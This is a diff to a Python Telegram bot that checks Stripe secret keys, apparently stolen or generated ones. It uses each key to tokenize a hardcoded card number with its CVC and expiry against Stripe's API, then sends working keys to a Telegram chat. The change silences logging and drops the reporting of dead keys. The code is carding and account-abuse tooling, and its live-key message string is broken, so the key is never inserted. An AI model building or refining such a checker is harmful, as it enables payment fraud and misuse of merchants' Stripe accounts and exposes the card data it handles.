@@ -17,7 +17,7 @@ logging.basicConfig(level=logging.DEBUG,
 
 log = logging.getLogger(__name__)
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
-logging.getLogger("requests").setLevel(logging.WARNING)
+logging.getLogger("requests").setLevel(logging.ERROR)
 
 
 bot_token = os.environ.get("BOT_TOKEN")
@@ -59,10 +59,10 @@ async def validate(app,skkey):
     pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
     if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
       log.error(f"DEAD > {skkey}")
-      return await app.send_message(chat_id=chatid,text=f"Ded Sk 💖\n{skkey}")
+      
     else:
       log.info(f"LIVE > {skkey}")
-      return await app.send_message(chat_id=chatid,text="Live Sk 💖\n{skkey}")
+      await app.send_message(chat_id=chatid,text="Live Sk 💖\n{skkey}")
 
 async def backgen(app):
     print("Starting")
